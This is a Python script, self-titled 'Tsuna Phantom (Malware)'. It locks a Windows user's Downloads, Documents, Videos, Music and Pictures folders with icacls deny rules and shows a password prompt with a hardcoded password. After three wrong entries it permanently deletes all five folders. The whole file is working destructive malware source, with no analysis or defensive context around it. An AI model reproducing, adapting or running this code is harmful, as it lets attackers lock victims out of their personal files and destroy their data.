import os
import subprocess
import shutil
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk

def lock_folder(folder_path):
    try:
        subprocess.run(["icacls", folder_path, "/deny", "Everyone:(F)"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error locking folder {folder_path}: {e}")
        raise

def unlock_folder(folder_path):
    try:
        subprocess.run(["icacls", folder_path, "/grant", "Everyone:(F)"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error unlocking folder {folder_path}: {e}")
        raise

def delete_folder(folder_path):
    shutil.rmtree(folder_path)

def attempt_unlock(folders, password):
    attempts = 3
    for folder in folders:
        lock_folder(folder)
    print("Folders has been locked!")

    def check_password(event=None):
        nonlocal attempts
        user_input = password_entry.get()
        
        if user_input == password:
            for folder in folders:
                unlock_folder(folder)
            messagebox.showinfo("Success", "Correct password. Folder unlocked!")
            root.destroy()
        else:
            attempts -= 1
            if attempts > 0:
                messagebox.showwarning("Warning!", f"Wrong password. {attempts} Attemps left.")
                attempts_label.config(text=f"Attemps Left! ({attempts})")
            else:
                for folder in folders:
                    delete_folder(folder)
                messagebox.showerror("See You!", "No more chances. Folder will be deleted!")
                root.destroy()

    root = tk.Tk()
    root.geometry("500x150")
    root.title("Tsuna Phantom (Malware)")

    icon_path = "C:/Users/User/Desktop/Tsuna-Phantom/mal.jpeg"
    icon_image = Image.open(icon_path)
    icon_photo = ImageTk.PhotoImage(icon_image)
    root.iconphoto(False, icon_photo)

    bg_image_path = "C:/Users/User/Desktop/Tsuna-Phantom/bgmal.jpg"
    bg_image = Image.open(bg_image_path)
    bg_image = bg_image.resize((500, 150), Image.Resampling.LANCZOS)
    bg_photo = ImageTk.PhotoImage(bg_image)
    
    bg_label = tk.Label(root, image=bg_photo)
    bg_label.place(relwidth=1, relheight=1)

    # Make the frame background transparent
    frame = tk.Frame(root, bg='', bd=5)
    frame.place(relx=0.5, rely=0.5, anchor='center')

    label_text = f"Insert Password: Attempts left ({attempts})"
    attempts_label = tk.Label(frame, text=label_text, font=("Helvetica", 12), bg='#f0f0f0')
    attempts_label.pack()

    password_entry = tk.Entry(frame, show="*", width=40, justify='center', font=("Helvetica", 14))
    password_entry.pack(pady=10)
    password_entry.bind("<Return>", check_password)
    
    submit_button = tk.Button(frame, text="  Enter  ", command=check_password, font=("Helvetica", 12))
    submit_button.pack()

    root.mainloop()

if __name__ == "__main__":
    folders = [
        "C:/Users/User/Downloads",
        "C:/Users/User/Documents",
        "C:/Users/User/Videos",
        "C:/Users/User/Music",
        "C:/Users/User/Pictures"
    ]
    password = "gamon anjing"
    attempt_unlock(folders, password)
